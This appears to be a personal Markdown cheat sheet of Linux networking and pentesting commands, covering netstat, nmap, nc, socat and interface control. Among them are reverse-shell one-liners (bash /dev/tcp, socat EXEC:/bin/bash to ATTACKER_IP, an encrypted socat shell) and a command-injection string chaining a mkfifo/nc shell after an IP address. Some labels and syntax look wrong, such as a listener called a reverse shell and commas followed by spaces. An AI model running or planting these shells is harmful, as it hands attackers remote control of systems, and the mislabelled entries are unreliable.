# Network tool

* Check network throughput on different interfaces
```bash
cat /proc/net/dev
```

## `netstat`

* `-r` Show current system's routing table
```bash
netstat -r
```

* `-a` Show all connection, `-t` for TCP connection, `-u` for UDP connection
```bash
netstat -atu
```

* `-l` Show only listening connection.
```bash
netstat -lt
```

* `-p` Show the process and PID that is running to handle the network connection
```bash
netstat -p
```

* `-n` Show the numeric port number instead of trying to dynamically determine the symbolic host
```bash
netstat -n
```

* Restart network manager in kali
```bash
#!/bin/bash
sudo service networking restart
sudo service network-manager restart
```

# Network commands
* nmap -A: Aggressive mode
```bash
nmap -A IP
```

* Interactive bash shell
```bash
/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
```

* Another way to get reverse shell with command execution
```bash
192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
```

* TCP scanning with `nc`. `-w` specifies timeout in seconds. 
```bash
nc -nvv -w 1 -z 127.0.0.1 1000-2000
```
* Transfer file with `nc`! `-n` for numeric only IP addresses.
```bash
# Receiver
nc -nlvp 1337 > recv.txt

# Sender
nc 127.0.0.1 1337 < file.txt
```

* Scanning all services given a server with `nmap`
```bash
nmap -A 192.168.0.1
```

* `-sV` for detecting version, `-p-` for all ports, `-T4` for fast execution time.
```
nmap -p- -T4 -sV IP_ADDR
```

* `socat`, SOcket CAT, `TCP4` specifies the protocol, `-` is used to transfer data between `stdio` and remote host, allowing keyboard interaction with the shell
```bash
socat - TCP4:127.0.0.1:8080
```

* Bind a port to listen using `socat`, `STDOUT` redirects output to terminal
```bash
sudo socat TCP4-LISTEN:443 STDOUT
```

* File transfer with `socat`, `fork` will fork a child process whenever a client connects to the server, and will run indefinitely until killed. `file` is the option to specify which file to transfer. `create` will create the file if it doesn't exist.
```bash
server:
socat TCP4-LISTEN:8888,fork file:secret.txt

client:
socat TCP4:localhost:8888 file:receive.txt,create
```

* Reverse shell with `socat`, `-d -d` for more verbose output, `EXEC` is the option to run a target executable after client connects to it.
```bash
attacker:
socat -d -d TCP4-LISTEN:1337 STDOUT

victim:
socat TCP4:ATTACKER_IP:1337 EXEC:/bin/bash
```

* Encrypted reverse shell with `socat`. After generating a self-signed cert with `openssl`, we will use `cert` option to indicate our desire certificate to use for encryption, and `verify=0` to disable SSL certificate verification since it is a self-signed cert. 
```bash
attacker:
socat OPENSSL:VICTIM_IP:1337,verify=0

victim:
socat OPENSSL-LISTEN:1337 cert=server.pem, verify=0, fork EXEC:/bin/bash
```

* Show possible mount point given a server that is running NFS
```bash
showmount -e 192.168.0.1
```

* Show IP table rules
```bash
sudo iptables-save
```

* Disable a network interface card
```bash
sudo ifconfig eth0 down
```

* Enable a network interface card
```bash
sudo ifconfig eth0 up
```

* `ss`, socket statistic, `-a` shows all listening and non-listening sockets, `-n` displays the numeric IP, and does not resolve service name, `-t` specifies TCP sockets, `-l` displays only listening sockets, `-p` shows the process that is using the socket


